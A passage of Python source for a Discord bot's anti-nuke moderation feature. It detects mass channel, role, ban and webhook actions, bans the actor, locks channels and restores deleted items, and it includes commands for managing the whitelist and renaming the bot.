        # 1. Ban / kick the actor (human or bot)
        if actor and getattr(actor, "id", None) == OWNER_ID:
            actions_taken.append("🛡️ Skipped ban — target is bot owner (immune)")
        elif actor and _mikasa_is_allowed_bot_or_inviter(guild, int(actor.id)):
            actions_taken.append(f"🛡️ Skipped ban — **{actor}** is allowed via `,botallow` / allowed bots")
        elif actor and not self._is_whitelisted(guild, actor.id):
            try:
                await guild.ban(actor, reason=f"🛡️ Security Anti-Nuke: {reason}", delete_message_days=0)
                actions_taken.append(f"🔨 Banned **{actor}** (`{actor.id}`)")
            except Exception:
                pass

        # 2. Instant lockdown — remove Send Messages from @everyone in all channels at once
        everyone = guild.default_role
        async def _lock_ch(ch):
            try:
                ow = ch.overwrites_for(everyone)
                ow.send_messages = False
                await ch.set_permissions(everyone, overwrite=ow, reason="Security Anti-Nuke lockdown")
            except Exception:
                pass
        await asyncio.gather(*[_lock_ch(ch) for ch in guild.text_channels], return_exceptions=True)
        actions_taken.append(f"🔒 Locked **{len(guild.text_channels)}** channels (@everyone)")

        # 3. Restore only channels that are actually missing, and only after a
        # confirmed mass-channel-delete trigger. Mass bans/kicks and bot additions
        # must never recreate channels.
        if "Mass channel deletion" in reason:
            existing_channel_keys = {
                (str(getattr(ch, "type", "")), ch.name) for ch in guild.channels
            }
            missing_channels = [
                c for c in snap.get("channels", [])
                if (str(c.get("type", "")), c.get("name")) not in existing_channel_keys
            ]
            restored_ch = 0
            async def _restore_missing_channel(chdata):
                nonlocal restored_ch
                try:
                    if chdata["type"] == "text":
                        await guild.create_text_channel(
                            name=chdata["name"],
                            topic=chdata.get("topic"),
                            slowmode_delay=chdata.get("slowmode", 0),
                            reason="Security Anti-Nuke: restore missing deleted channel",
                        )
                    elif chdata["type"] == "voice":
                        await guild.create_voice_channel(
                            name=chdata["name"], reason="Security Anti-Nuke: restore missing deleted channel"
                        )
                    elif chdata["type"] == "category":
                        await guild.create_category(
                            name=chdata["name"], reason="Security Anti-Nuke: restore missing deleted channel"
                        )
                    restored_ch += 1
                except Exception:
                    pass
            await asyncio.gather(
                *[_restore_missing_channel(c) for c in missing_channels],
                return_exceptions=True,
            )
            if restored_ch:
                actions_taken.append(f"♻️ Restored **{restored_ch}** missing channel(s)")
            else:
                actions_taken.append("✅ No missing channels found; nothing was recreated")

        # 4. Restore only missing roles after a confirmed mass-role-delete trigger.
        if "Mass role deletion" in reason:
            existing_role_names = {r.name for r in guild.roles}
            missing_roles = [r for r in snap.get("roles", []) if r.get("name") not in existing_role_names]
            restored_roles = 0
            for rdata in missing_roles:
                try:
                    await guild.create_role(
                        name=rdata["name"],
                        color=discord.Color(rdata["color"]),
                        hoist=rdata["hoist"],
                        permissions=discord.Permissions(rdata["perms"]),
                        reason="Security Anti-Nuke: restore missing deleted role",
                    )
                    restored_roles += 1
                    await asyncio.sleep(0.4)
                except Exception:
                    pass
            if restored_roles:
                actions_taken.append(f"♻️ Restored **{restored_roles}** missing role(s)")
            else:
                actions_taken.append("✅ No missing roles found; nothing was recreated")

        # 5. Restore server name / icon only for a confirmed server-settings edit.
        if "server name/icon edit" in reason and snap.get("name") and guild.name != snap["name"]:
            try:
                await guild.edit(name=snap["name"], reason="Security Anti-Nuke restore")
                actions_taken.append("🏷️ Restored server name")
            except Exception:
                pass
        if "server name/icon edit" in reason and snap.get("icon_bytes"):
            try:
                ic = snap["icon_bytes"]
                await guild.edit(icon=bytes(ic) if isinstance(ic, list) else ic, reason="Security Anti-Nuke restore")
                actions_taken.append("🖼️ Restored server icon")
            except Exception:
                pass

        # Refresh snapshot after restore
        await asyncio.sleep(3)
        await self._take_snapshot(guild)

        # ── Alert embed ───────────────────────────────────────
        alert_e = discord.Embed(
            title="🔒 Security Anti-Nuke Triggered — Server Protected",
            description=f"**Reason:** {reason}",
            color=0xFF0000,
            timestamp=discord.utils.utcnow(),
        )
        alert_e.add_field(name="🖥️ Server",     value=f"**{guild.name}** (`{guild.id}`)", inline=False)
        alert_e.add_field(name="⚡ Actions Taken", value="\n".join(actions_taken) or "None", inline=False)
        alert_e.set_footer(text="Coolbot 🔒 Security Anti-Nuke")

        # DM bot owner
        try:
            owner = await self.bot.fetch_user(OWNER_ID)
            await owner.send(embed=alert_e)
        except Exception:
            pass

        # DM server owner (if different)
        try:
            if guild.owner_id != OWNER_ID:
                srv_owner = await self.bot.fetch_user(guild.owner_id)
                await srv_owner.send(embed=alert_e)
        except Exception:
            pass

        # Send to antinuke alert channel if set
        settings = load("server_settings")
        alert_ch_id = gdata(settings, guild.id).get("antinuke_channel")
        if alert_ch_id:
            try:
                alert_ch = guild.get_channel(alert_ch_id)
                if alert_ch:
                    await alert_ch.send(embed=alert_e)
            except Exception:
                pass
        else:
            # Fallback: first available text channel
            try:
                ch = next((c for c in guild.text_channels), None)
                if ch:
                    await ch.send(embed=alert_e)
            except Exception:
                pass

    # ── listeners ─────────────────────────────────────────────
    @commands.Cog.listener()
    async def on_guild_channel_delete(self, channel: discord.abc.GuildChannel):
        guild = channel.guild
        if not self._is_enabled(guild): return
        actor = await self._get_actor(guild, discord.AuditLogAction.channel_delete, seconds=5, target_id=channel.id)
        if actor and self._is_whitelisted(guild, actor.id, "channels"): return
        uid = actor.id if actor else 0
        if not actor: return
        count = self._window(self._ch_del, guild.id, uid, 3)
        if count >= 5:
            self._ch_del[guild.id] = []
            asyncio.create_task(self._respond(guild, actor, f"Mass channel deletion ({count} in 3s)"))

    @commands.Cog.listener()
    async def on_guild_role_delete(self, role: discord.Role):
        guild = role.guild
        if not self._is_enabled(guild): return
        actor = await self._get_actor(guild, discord.AuditLogAction.role_delete, seconds=5, target_id=role.id)
        if actor and self._is_whitelisted(guild, actor.id, "roles"): return
        uid = actor.id if actor else 0
        if not actor: return
        count = self._window(self._role_del, guild.id, uid, 3)
        if count >= 5:
            self._role_del[guild.id] = []
            asyncio.create_task(self._respond(guild, actor, f"Mass role deletion ({count} in 3s)"))

    @commands.Cog.listener()
    async def on_member_ban(self, guild: discord.Guild, user: discord.User):
        if not self._is_enabled(guild): return
        actor = await self._get_actor(guild, discord.AuditLogAction.ban, seconds=5, target_id=user.id)
        if actor and self._is_whitelisted(guild, actor.id, "bans"): return
        uid = actor.id if actor else 0
        if not actor: return
        count = self._window(self._bans, guild.id, uid, 3)
        if count >= 5:
            self._bans[guild.id] = []
            asyncio.create_task(self._respond(guild, actor, f"Mass ban ({count} in 3s)"))

    @commands.Cog.listener()
    async def on_member_remove(self, member: discord.Member):
        guild = member.guild
        if not self._is_enabled(guild):
            return
        actor = None
        try:
            async for entry in guild.audit_logs(limit=8, action=discord.AuditLogAction.kick):
                if entry.target and entry.target.id == member.id and (discord.utils.utcnow() - entry.created_at).total_seconds() < 3:
                    actor = entry.user
                    break
        except Exception:
            return
        if not actor or actor.id == self.bot.user.id or self._is_whitelisted(guild, actor.id, "bans"):
            return
        count = self._window(self._bans, guild.id, actor.id, 3)
        if count >= 5:
            self._bans[guild.id] = []
            asyncio.create_task(self._respond(guild, actor, f"Mass kick ({count} in 3s)"))

    @commands.Cog.listener()
    async def on_webhooks_update(self, channel: discord.TextChannel):
        guild = channel.guild
        if not self._is_enabled(guild): return
        actor = await self._get_actor(guild, discord.AuditLogAction.webhook_create, seconds=10)
        if not actor or self._is_whitelisted(guild, actor.id, "webhooks"): return
        count = self._window(self._webhooks, guild.id, actor.id, 3)
        if count >= 5:
            self._webhooks[guild.id] = []
            asyncio.create_task(self._respond(guild, actor, f"Webhook abuse ({count} created in 3s)"))

    @commands.Cog.listener()
    async def on_guild_update(self, before: discord.Guild, after: discord.Guild):
        if not self._is_enabled(after): return
        if before.name == after.name and before.icon == after.icon: return
        actor = await self._get_actor(after, discord.AuditLogAction.guild_update, seconds=5)
        if not actor or self._is_whitelisted(after, actor.id, "server"): return
        asyncio.create_task(self._respond(after, actor, "Unauthorized server name/icon edit"))

    # ── commands ──────────────────────────────────────────────
    @commands.hybrid_command(name="antinuke", description="Security Anti-Nuke: on/off/status/whitelist/lockdown", aliases=["security", "sec"])
    async def antinuke(self, ctx, action: str = "status", *, target: str = None):
        if not _mikasa_has_premium_access(ctx):
            return await ctx.send(embed=discord.Embed(description="❌ Owner or Premium only.", color=COLORS["error"]), ephemeral=False)

        settings = load("server_settings")
        gs       = gdata(settings, ctx.guild.id)
        action   = action.lower()

        if action in ("on", "enable", "true"):
            gs["antinuke_enabled"] = True
            save("server_settings", settings)
            await self._take_snapshot(ctx.guild)
            e = discord.Embed(
                title="🔒 Security Anti-Nuke — ENABLED",
                description=(
                    "✅ Security Anti-Nuke is now **active** on this server.\n\n"
                    "**Protecting against:**\n"
                    "> • Mass channel deletes (5+ by one actor in 3s)\n"
                    "> • Mass role deletes (5+ by one actor in 3s)\n"
                    "> • Mass bans/kicks (5+ by one actor in 3s)\n"
                    "> • Webhook abuse (5+ by one actor in 3s)\n"
                    "> • Unauthorized server edits\n\n"
                    "Snapshot taken. Auto-refreshes every 30 min."
                ),
                color=COLORS["success"],
            )
            await ctx.send(embed=e)

        elif action in ("off", "disable", "false"):
            gs["antinuke_enabled"] = False
            save("server_settings", settings)
            await ctx.send(embed=discord.Embed(
                title="🔒 Security Anti-Nuke — DISABLED",
                description="⚠️ Security Anti-Nuke has been **turned off**. Server is unprotected.",
                color=COLORS["warn"],
            ))

        elif action == "whitelist":
            # ,antinuke whitelist @user [category...]
            if not target:
                cats_help = " · ".join(f"`{k}`" for k in self.WL_CATEGORIES if k != "all")
                return await ctx.send(embed=discord.Embed(
                    title="🔒 Anti-Nuke Whitelist",
                    description=(
                        "**Usage:**\n"
                        "`,antinuke whitelist @user` — full exemption (all categories)\n"
                        "`,antinuke whitelist @user roles` — only Role Management\n"
                        "`,antinuke whitelist @user roles channels bans` — multiple\n\n"
                        f"**Categories:** {cats_help} · `all`"
                    ),
                    color=COLORS["info"],
                ))
            member = None
            cat_args = []
            if ctx.message and ctx.message.mentions:
                member = ctx.message.mentions[0]
                parts = target.replace(f"<@{member.id}>", " ").replace(f"<@!{member.id}>", " ").split()
                cat_args = [p.lower().strip() for p in parts if p.strip()]
            else:
                parts = target.split()
                try:
                    member = await ctx.guild.fetch_member(int(parts[0]))
                    cat_args = [p.lower() for p in parts[1:]]
                except Exception:
                    return await ctx.send(embed=discord.Embed(
                        description="❌ Could not resolve that user. Mention them or pass their ID.",
                        color=COLORS["error"],
                    ))
            if not cat_args:
                cat_args = ["all"]
            valid, invalid = [], []
            for c in cat_args:
                (valid if c in self.WL_CATEGORIES else invalid).append(c)
            if not valid:
                return await ctx.send(embed=discord.Embed(
                    description=f"❌ Unknown category. Use: {', '.join(self.WL_CATEGORIES)}",
                    color=COLORS["error"],
                ))
            wl_map = self._get_wl_map(ctx.guild)
            existing = set(wl_map.get(str(member.id), []))
            if "all" in valid:
                existing = {"all"}
            else:
                existing.discard("all")
                existing.update(valid)
            wl_map[str(member.id)] = sorted(existing)
            self._save_wl_map(ctx.guild, wl_map)
            labels = [self.WL_CATEGORIES[c] for c in wl_map[str(member.id)]]
            note = ("\n⚠️ Ignored unknown: " + ", ".join(invalid)) if invalid else ""
            desc = f"✅ **{member.display_name}** whitelisted for:\n" + "\n".join(f"• {l}" for l in labels) + note
            await ctx.send(embed=discord.Embed(description=desc, color=COLORS["success"]))

        elif action == "unwhitelist":
            if not target:
                return await ctx.send(embed=discord.Embed(
                    description="Usage: `,antinuke unwhitelist @user [category]`\nOmit category to remove all exemptions.",
                    color=COLORS["error"],
                ))
            member = None
            cat_args = []
            if ctx.message and ctx.message.mentions:
                member = ctx.message.mentions[0]
                parts = target.replace(f"<@{member.id}>", " ").replace(f"<@!{member.id}>", " ").split()
                cat_args = [p.lower().strip() for p in parts if p.strip()]
            else:
                parts = target.split()
                try:
                    member = await ctx.guild.fetch_member(int(parts[0]))
                    cat_args = [p.lower() for p in parts[1:]]
                except Exception:
                    return await ctx.send(embed=discord.Embed(
                        description="❌ Could not resolve that user.",
                        color=COLORS["error"],
                    ))
            wl_map = self._get_wl_map(ctx.guild)
            key = str(member.id)
            if key not in wl_map:
                return await ctx.send(embed=discord.Embed(
                    description=f"**{member.display_name}** is not on the whitelist.",
                    color=COLORS["info"],
                ))
            if not cat_args or "all" in cat_args:
                wl_map.pop(key, None)
                msg = f"✅ Removed **{member.display_name}** from the whitelist entirely."
            else:
                remaining = [c for c in wl_map[key] if c not in cat_args]
                if remaining:
                    wl_map[key] = remaining
                    msg = f"✅ Removed categories from **{member.display_name}**: {', '.join(cat_args)}"
                else:
                    wl_map.pop(key, None)
                    msg = f"✅ Removed **{member.display_name}** from the whitelist (no categories left)."
            self._save_wl_map(ctx.guild, wl_map)
            await ctx.send(embed=discord.Embed(description=msg, color=COLORS["success"]))

        elif action == "status":
            enabled = gs.get("antinuke_enabled", False)
            ch_id = gs.get("antinuke_channel")
            ch_txt = f"<#{ch_id}>" if ch_id else "Not set"
            snap = self.snapshots.get(ctx.guild.id, {})
            wl_map = self._get_wl_map(ctx.guild)
            wl_lines = []
            for uid, cats in list(wl_map.items())[:15]:
                labels = ", ".join(self.WL_CATEGORIES.get(c, c) for c in cats)
                wl_lines.append(f"• <@{uid}> — {labels}")
            role_map = self._get_role_wl_map(ctx.guild)
            for rid, cats in list(role_map.items())[:15]:
                labels = ", ".join(self.WL_CATEGORIES.get(c, c) for c in cats)
                wl_lines.append(f"• Role <@&{rid}> — {labels}")
            wl_txt = "\n".join(wl_lines) if wl_lines else "None"
            e = discord.Embed(
                title="🔒 Security Anti-Nuke — Status",
                color=COLORS["success"] if enabled else COLORS["error"],
            )
            e.add_field(name="State", value="🟢 **Enabled**" if enabled else "🔴 **Disabled**", inline=True)
            e.add_field(name="Alert Channel", value=ch_txt, inline=True)
            e.add_field(
                name="📸 Snapshot",
                value=f"{len(snap.get('channels', []))} ch · {len(snap.get('roles', []))} roles" if snap else "None",
                inline=True,
            )
            e.add_field(name="✅ Whitelist", value=wl_txt, inline=False)
            e.add_field(
                name="⚡ Thresholds",
                value=(
                    "> Channel deletes: **5 by one actor in 3s**\n"
                    "> Role deletes: **5 by one actor in 3s**\n"
                    "> Bans/kicks: **5 by one actor in 3s**\n"
                    "> Webhooks: **5 by one actor in 3s**\n"
                    "> Server edits: **instant**"
                ),
                inline=False,
            )
            e.set_footer(text="Coolbot 🔒 Security Anti-Nuke · categories: roles channels webhooks server bots bans other all")
            await ctx.send(embed=e)

        elif action in ("setchannel", "channel", "alertchannel"):
            ch = ctx.message.channel_mentions[0] if ctx.message and ctx.message.channel_mentions else ctx.channel
            gs["antinuke_channel"] = ch.id
            save("server_settings", settings)
            await ctx.send(embed=discord.Embed(
                description=f"✅ Security Anti-Nuke alerts will now go to {ch.mention}.",
                color=COLORS["success"],
            ))

        elif action == "snapshot":
            await self._take_snapshot(ctx.guild)
            snap = self.snapshots.get(ctx.guild.id, {})
            await ctx.send(embed=discord.Embed(
                title="📸 Snapshot Taken",
                description=(
                    f"> **Channels saved:** {len(snap.get('channels', []))}\n"
                    f"> **Roles saved:** {len(snap.get('roles', []))}\n"
                    f"> **Server name:** `{snap.get('name', '?')}`\n"
                    f"> **Icon:** {'✅' if snap.get('icon_bytes') else '❌ No icon'}"
                ),
                color=COLORS["success"],
            ))

        elif action == "lockdown":
            everyone = ctx.guild.default_role
            locked = 0
            for ch in ctx.guild.text_channels:
                try:
                    ow = ch.overwrites_for(everyone)
                    ow.send_messages = False
                    await ch.set_permissions(everyone, overwrite=ow, reason="Manual Security Anti-Nuke lockdown")
                    locked += 1
                except Exception:
                    pass
            await ctx.send(embed=discord.Embed(
                title="🔒 Emergency Lockdown",
                description=f"Locked **{locked}** channels — @everyone can no longer send messages.\nUse `,unlock` in each channel or `,antinuke unlock` to lift.",
                color=COLORS["error"],
            ))

        elif action == "unlock":
            everyone = ctx.guild.default_role
            unlocked = 0
            for ch in ctx.guild.text_channels:
                try:
                    ow = ch.overwrites_for(everyone)
                    ow.send_messages = None
                    await ch.set_permissions(everyone, overwrite=ow, reason="Security Anti-Nuke lockdown lifted")
                    unlocked += 1
                except Exception:
                    pass
            await ctx.send(embed=discord.Embed(
                description=f"🔓 Unlocked **{unlocked}** channels.",
                color=COLORS["success"],
            ))

        elif action in ("status", "info"):
            enabled = gs.get("antinuke_enabled", False)
            wl_map = self._get_wl_map(ctx.guild)
            wl_names = []
            for uid, cats in list(wl_map.items())[:15]:
                labels = ", ".join(self.WL_CATEGORIES.get(c, c) for c in cats)
                wl_names.append(f"<@{uid}> ({labels})")
            role_map = self._get_role_wl_map(ctx.guild)
            for rid, cats in list(role_map.items())[:10]:
                labels = ", ".join(self.WL_CATEGORIES.get(c, c) for c in cats)
                wl_names.append(f"<@&{rid}> ({labels})")
            alert_ch_id = gs.get("antinuke_channel")
            alert_ch = ctx.guild.get_channel(alert_ch_id) if alert_ch_id else None
            snap     = self.snapshots.get(ctx.guild.id, {})
            e.add_field(name="✅ Whitelist",      value=", ".join(wl_names) or "None", inline=False)
            e.add_field(
                name="⚡ Thresholds",
                value=(
                    "> Channel deletes: **5 by one actor in 3s**\n"
                    "> Role deletes: **5 by one actor in 3s**\n"
                    "> Bans/kicks: **5 by one actor in 3s**\n"
                    "> Webhooks: **5 by one actor in 3s**\n"
                    "> Server edits: **instant**"
                ),
                inline=False,
            )
            e.set_footer(text="Coolbot 🔒 Security Anti-Nuke")
            await ctx.send(embed=e)

        else:
            await ctx.send(embed=discord.Embed(
                title="🔒 Security Anti-Nuke — Help",
                description=(
                    "> `,antinuke on` — enable protection\n"
                    "> `,antinuke off` — disable protection\n"
                    "> `,antinuke status` — show current settings\n"
                    "> `,antinuke whitelist @user` — exempt a trusted user\n"
                    "> `,antinuke unwhitelist @user` — remove exemption\n"
                    "> `,antinuke setchannel [#ch]` — set alert channel\n"
                    "> `,antinuke snapshot` — force a new snapshot now\n"
                    "> `,antinuke lockdown` — manual emergency lockdown\n"
                    "> `,antinuke unlock` — lift the lockdown"
                ),
                color=COLORS["main"],
            ))




# ── Whitelist (Anti-Nuke category exemptions) ─────────────────────────────
_WL_CAT_CHOICES = [
    app_commands.Choice(name="All Categories", value="all"),
    app_commands.Choice(name="Role Management", value="roles"),
    app_commands.Choice(name="Channel Management", value="channels"),
    app_commands.Choice(name="Webhook Management", value="webhooks"),
    app_commands.Choice(name="Server Settings", value="server"),
    app_commands.Choice(name="Bot & Integration Management", value="bots"),
    app_commands.Choice(name="Ban & Kick Management", value="bans"),
    app_commands.Choice(name="Other Protected Actions", value="other"),
]

async def _wl_apply_user(guild, user_id: int, display: str, cats: list) -> str:
    cog = bot.get_cog("AntiNukeCog")
    if cog is None:
        return "Anti-Nuke not loaded."
    if not cats:
        cats = ["all"]
    valid = [c for c in cats if c in cog.WL_CATEGORIES]
    if not valid:
        return f"Unknown category. Use: {', '.join(cog.WL_CATEGORIES)}"
    wl_map = cog._get_wl_map(guild)
    existing = set(wl_map.get(str(user_id), []))
    if "all" in valid:
        existing = {"all"}
    else:
        existing.discard("all")
        existing.update(valid)
    wl_map[str(user_id)] = sorted(existing)
    cog._save_wl_map(guild, wl_map)
    labels = [cog.WL_CATEGORIES[c] for c in wl_map[str(user_id)]]
    return f"✅ **{display}** whitelisted for:\n" + "\n".join(f"• {l}" for l in labels)

async def _wl_apply_role(guild, role: discord.Role, cats: list) -> str:
    cog = bot.get_cog("AntiNukeCog")
    if cog is None:
        return "Anti-Nuke not loaded."
    if not cats:
        cats = ["all"]
    valid = [c for c in cats if c in cog.WL_CATEGORIES]
    if not valid:
        return f"Unknown category. Use: {', '.join(cog.WL_CATEGORIES)}"
    role_map = cog._get_role_wl_map(guild)
    existing = set(role_map.get(str(role.id), []))
    if "all" in valid:
        existing = {"all"}
    else:
        existing.discard("all")
        existing.update(valid)
    role_map[str(role.id)] = sorted(existing)
    cog._save_role_wl_map(guild, role_map)
    labels = [cog.WL_CATEGORIES[c] for c in role_map[str(role.id)]]
    return (
        f"✅ Role {role.mention} grants whitelist for:\n"
        + "\n".join(f"• {l}" for l in labels)
        + "\nAnyone with this role is exempt for those categories."
    )

@bot.hybrid_command(name="whitelist", description="Anti-Nuke whitelist a user or role for protected categories")
@app_commands.describe(
    target="User or role to whitelist",
    category="Category (default: all)",
    category2="Optional second category",
    category3="Optional third category",
)
@app_commands.choices(category=_WL_CAT_CHOICES, category2=_WL_CAT_CHOICES, category3=_WL_CAT_CHOICES)
async def whitelist_cmd(
    ctx: commands.Context,
    target: str = None,
    category: str = None,
    category2: str = None,
    category3: str = None,
):
    """Whitelist user or role. Examples:
    ,whitelist @user
    ,whitelist @user roles channels
    ,whitelist role @Mod roles bans
    /whitelist target:@Mod category:Role Management
    """
    if not _mikasa_has_premium_access(ctx):
        return await ctx.send(embed=discord.Embed(description="🔒 Owner or Premium Access role only.", color=COLORS["error"]))
    if not ctx.guild:
        return await ctx.send(embed=discord.Embed(description="❌ Server only.", color=COLORS["error"]))

    cog = bot.get_cog("AntiNukeCog")
    if cog is None:
        return await ctx.send(embed=discord.Embed(description="❌ Anti-Nuke not loaded.", color=COLORS["error"]))

    # Collect categories from slash choices or free text
    cats = []
    for c in (category, category2, category3):
        if c and str(c).lower() not in ("none", ""):
            # slash may pass Choice or str
            val = getattr(c, "value", c)
            cats.append(str(val).lower())

    # Prefix: ,whitelist @user roles channels  OR  ,whitelist role @Role bots
    role_target = None
    member_target = None
    extra_tokens = []

    if ctx.message and not getattr(ctx, "interaction", None):
        raw = (ctx.message.content or "")
        # strip command name
        parts = raw.split()[1:]  # after ,whitelist
        if parts and parts[0].lower() == "role":
            if ctx.message.role_mentions:
                role_target = ctx.message.role_mentions[0]
            elif len(parts) >= 2:
                try:
                    role_target = ctx.guild.get_role(int(parts[1].strip("<@&>")))
                except Exception:
                    role_target = None
            extra_tokens = [p.lower() for p in parts[2:]] if role_target else [p.lower() for p in parts[1:]]
        else:
            if ctx.message.mentions:
                member_target = ctx.message.mentions[0]
                # tokens after mention
                extra_tokens = []
                for p in parts:
                    if p.startswith("<@") and p.endswith(">"):
                        continue
                    if p.lower() in cog.WL_CATEGORIES:
                        extra_tokens.append(p.lower())
            elif parts:
                try:
                    uid = int(parts[0].strip("<@!>"))
                    member_target = ctx.guild.get_member(uid)
                    if member_target is None:
                        class _T:
                            pass
                        member_target = _T()
                        member_target.id = uid
                        member_target.display_name = str(uid)
                    extra_tokens = [p.lower() for p in parts[1:] if p.lower() in cog.WL_CATEGORIES or p.lower() == "all"]
                except Exception:
                    pass
        if extra_tokens:
            cats = extra_tokens

    # Slash / hybrid resolved target string may be a mention
    if member_target is None and role_target is None and target:
        t = str(target).strip()
        # role mention
        if t.startswith("<@&") and t.endswith(">"):
            try:
                role_target = ctx.guild.get_role(int(t[3:-1]))
            except Exception:
                pass
        elif t.lower().startswith("role"):
            # handled above for prefix
            pass
        else:
            if ctx.message and ctx.message.role_mentions and "role" in (ctx.message.content or "").lower().split()[:3]:
                role_target = ctx.message.role_mentions[0]
            elif ctx.message and ctx.message.mentions:
                member_target = ctx.message.mentions[0]
            else:
                try:
                    uid = int(t.strip("<@!>"))
                    member_target = ctx.guild.get_member(uid)
                    if member_target is None:
                        class _T2:
                            pass
                        member_target = _T2()
                        member_target.id = uid
                        member_target.display_name = str(uid)
                except Exception:
                    # try role id
                    try:
                        role_target = ctx.guild.get_role(int(t.strip("<@&>")))
                    except Exception:
                        pass

    if role_target is None and member_target is None:
        cats_help = " · ".join(f"`{k}`" for k in cog.WL_CATEGORIES if k != "all")
        return await ctx.send(embed=discord.Embed(
            title="🔒 Whitelist",
            description=(
                "**User:** `,whitelist @user [categories]`\n"
                "**Role:** `,whitelist role @Role [categories]`\n"
                f"**Categories:** {cats_help} · `all`\n\n"
                "Anyone with a whitelisted role gets those category exemptions."
            ),
            color=COLORS["info"],
        ))

    if role_target is not None:
        msg = await _wl_apply_role(ctx.guild, role_target, cats or ["all"])
    else:
        msg = await _wl_apply_user(ctx.guild, member_target.id, getattr(member_target, "display_name", str(member_target.id)), cats or ["all"])
    await ctx.send(embed=discord.Embed(description=msg, color=COLORS["success"] if msg.startswith("✅") else COLORS["error"]))


@bot.hybrid_command(name="unwhitelist", description="Remove Anti-Nuke whitelist from a user or role")
@app_commands.describe(
    target="User or role to remove",
    category="Category to remove (all = full remove)",
)
@app_commands.choices(category=_WL_CAT_CHOICES)
async def unwhitelist_cmd(ctx: commands.Context, target: str = None, category: str = "all"):
    if not _mikasa_has_premium_access(ctx):
        return await ctx.send(embed=discord.Embed(description="❌ Owner or Premium only.", color=COLORS["error"]))
    if not ctx.guild:
        return await ctx.send(embed=discord.Embed(description="❌ Server only.", color=COLORS["error"]))
    cog = bot.get_cog("AntiNukeCog")
    if cog is None:
        return await ctx.send(embed=discord.Embed(description="❌ Anti-Nuke not loaded.", color=COLORS["error"]))

    cat = getattr(category, "value", category) if category else "all"
    cat = str(cat).lower() if cat else "all"

    role_target = None
    member_target = None
    if ctx.message and not getattr(ctx, "interaction", None):
        parts = (ctx.message.content or "").split()[1:]
        if parts and parts[0].lower() == "role":
            if ctx.message.role_mentions:
                role_target = ctx.message.role_mentions[0]
            if len(parts) >= 3 and parts[2].lower() in cog.WL_CATEGORIES:
                cat = parts[2].lower()
        elif ctx.message.mentions:
            member_target = ctx.message.mentions[0]
            if len(parts) >= 2 and parts[1].lower() in cog.WL_CATEGORIES:
                cat = parts[1].lower()
        elif parts:
            try:
                uid = int(parts[0].strip("<@!>"))
                member_target = ctx.guild.get_member(uid)
                if member_target is None:
                    class _T3:
                        pass
                    member_target = _T3()
                    member_target.id = uid
                    member_target.display_name = str(uid)
            except Exception:
                try:
                    role_target = ctx.guild.get_role(int(parts[0].strip("<@&>")))
                except Exception:
                    pass

    if role_target is None and member_target is None and target:
        t = str(target).strip()
        if t.startswith("<@&"):
            try:
                role_target = ctx.guild.get_role(int(t[3:-1]))
            except Exception:
                pass
        elif ctx.message and ctx.message.role_mentions:
            role_target = ctx.message.role_mentions[0]
        elif ctx.message and ctx.message.mentions:
            member_target = ctx.message.mentions[0]
        else:
            try:
                uid = int(t.strip("<@!>"))
                member_target = ctx.guild.get_member(uid)
                if member_target is None:
                    class _T4:
                        pass
                    member_target = _T4()
                    member_target.id = uid
                    member_target.display_name = str(uid)
            except Exception:
                pass

    if role_target is None and member_target is None:
        return await ctx.send(embed=discord.Embed(
            description="Usage: `,unwhitelist @user [category]` or `,unwhitelist role @Role [category]`",
            color=COLORS["error"],
        ))

    if role_target is not None:
        role_map = cog._get_role_wl_map(ctx.guild)
        key = str(role_target.id)
        if key not in role_map:
            return await ctx.send(embed=discord.Embed(description=f"Role {role_target.mention} is not on the whitelist.", color=COLORS["info"]))
        if cat == "all":
            role_map.pop(key, None)
            msg = f"✅ Removed whitelist from role {role_target.mention}."
        else:
            remaining = [c for c in role_map[key] if c != cat]
            if remaining:
                role_map[key] = remaining
                msg = f"✅ Removed `{cat}` from role {role_target.mention}."
            else:
                role_map.pop(key, None)
                msg = f"✅ Removed whitelist from role {role_target.mention}."
        cog._save_role_wl_map(ctx.guild, role_map)
        return await ctx.send(embed=discord.Embed(description=msg, color=COLORS["success"]))

    wl_map = cog._get_wl_map(ctx.guild)
    key = str(member_target.id)
    if key not in wl_map:
        return await ctx.send(embed=discord.Embed(
            description=f"**{getattr(member_target, 'display_name', key)}** is not on the whitelist.",
            color=COLORS["info"],
        ))
    if cat == "all":
        wl_map.pop(key, None)
        msg = f"✅ Removed **{getattr(member_target, 'display_name', key)}** from the whitelist."
    else:
        remaining = [c for c in wl_map[key] if c != cat]
        if remaining:
            wl_map[key] = remaining
            msg = f"✅ Removed `{cat}` from **{getattr(member_target, 'display_name', key)}**."
        else:
            wl_map.pop(key, None)
            msg = f"✅ Removed **{getattr(member_target, 'display_name', key)}** from the whitelist."
    cog._save_wl_map(ctx.guild, wl_map)
    await ctx.send(embed=discord.Embed(description=msg, color=COLORS["success"]))



# ── Bot name / alias + owner server tools ─────────────────────────────────
@bot.hybrid_command(name="botname", aliases=["setbotname", "botnick"], description="Change the bot's name/nickname and AI call-name")
@app_commands.describe(
    name="New name (guild nickname + AI alias). Use 'clear' to reset nick.",
    global_username="Optional: change global Discord username (owner only, rate-limited)",
)
async def botname_cmd(ctx: commands.Context, name: str, global_username: str = None):
    """Owner: set bot nickname in this server and/or global username.
    Also registers the name so the AI responds when people say it.
    """
    if not has_owner_access(ctx.author):
        return await ctx.send(embed=discord.Embed(description="❌ Owner only.", color=COLORS["error"]))
    global BOT_ALIASES, BOT_NAME
    results = []
    name = (name or "").strip()
    if not name:
        return await ctx.send(embed=discord.Embed(
            description="Usage: `,botname <name>` · `,botname clear` · `/botname name:Mia global_username:MiaBot`",
            color=COLORS["info"],
        ))

    # Guild nickname
    if ctx.guild and ctx.guild.me:
        try:
            if name.lower() == "clear":
                await ctx.guild.me.edit(nick=None, reason="botname clear")
                results.append("✅ Guild nickname **cleared**.")
            else:
                await ctx.guild.me.edit(nick=name[:32], reason=f"botname by {ctx.author}")
                results.append(f"✅ Guild nickname set to **{name[:32]}**.")
        except Exception as ex:
            results.append(f"⚠️ Guild nick failed: `{ex}`")

    # AI alias
    if name.lower() != "clear":
        alias = name.lower().strip()
        if alias and alias not in BOT_ALIASES:
            BOT_ALIASES.append(alias)
            # also common variants
            if alias.replace(" ", "") not in BOT_ALIASES:
                BOT_ALIASES.append(alias.replace(" ", ""))
            try:
                save("bot_aliases", BOT_ALIASES)
            except Exception:
                pass
        results.append(f"✅ AI will respond to **{name}** (and mentions).")
    else:
        results.append("ℹ️ AI aliases kept (use `,botname alias remove <name>` to drop one).")

    # Optional global username
    if global_username and global_username.strip():
        try:
            await bot.user.edit(username=global_username.strip()[:32])
            results.append(f"✅ Global username set to **{global_username.strip()[:32]}**.")
